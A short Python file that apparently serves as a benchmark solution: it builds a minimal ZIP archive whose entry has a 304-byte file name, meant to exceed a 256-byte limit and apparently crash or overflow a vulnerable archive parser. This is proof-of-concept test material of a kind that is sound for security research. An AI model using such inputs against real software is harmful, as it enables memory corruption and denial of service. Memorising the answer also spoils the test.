import struct
import binascii


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a filename longer than 256 bytes
        base_name = b"A" * 300
        extension = b".txt"
        filename = base_name + extension  # 304 bytes

        # Minimal file data
        file_data = b"B"
        crc = binascii.crc32(file_data) & 0xFFFFFFFF
        extra = b""

        # Local file header
        local_header_offset = 0
        local_file_header = (
            struct.pack(
                "<IHHHHHIIIHH",
                0x04034B50,          # Local file header signature
                20,                  # Version needed to extract
                0,                   # General purpose bit flag
                0,                   # Compression method (store)
                0,                   # Last mod file time
                0,                   # Last mod file date
                crc,                 # CRC-32
                len(file_data),      # Compressed size
                len(file_data),      # Uncompressed size
                len(filename),       # File name length
                len(extra),          # Extra field length
            )
            + filename
            + extra
            + file_data
        )

        # Central directory header
        central_dir_offset = len(local_file_header)
        central_file_header = (
            struct.pack(
                "<IHHHHHHIIIHHHHHII",
                0x02014B50,          # Central file header signature
                20,                  # Version made by
                20,                  # Version needed to extract
                0,                   # General purpose bit flag
                0,                   # Compression method
                0,                   # Last mod file time
                0,                   # Last mod file date
                crc,                 # CRC-32
                len(file_data),      # Compressed size
                len(file_data),      # Uncompressed size
                len(filename),       # File name length
                len(extra),          # Extra field length
                0,                   # File comment length
                0,                   # Disk number start
                0,                   # Internal file attributes
                0,                   # External file attributes
                local_header_offset, # Relative offset of local header
            )
            + filename
            + extra
        )

        central_dir_size = len(central_file_header)

        # End of central directory record
        end_of_central_dir = struct.pack(
            "<IHHHHIIH",
            0x06054B50,          # End of central dir signature
            0,                   # Number of this disk
            0,                   # Disk with start of central directory
            1,                   # Total entries in central dir on this disk
            1,                   # Total entries in central dir
            central_dir_size,    # Size of central directory
            central_dir_offset,  # Offset of start of central directory
            0,                   # ZIP file comment length
        )

        return local_file_header + central_file_header + end_of_central_dir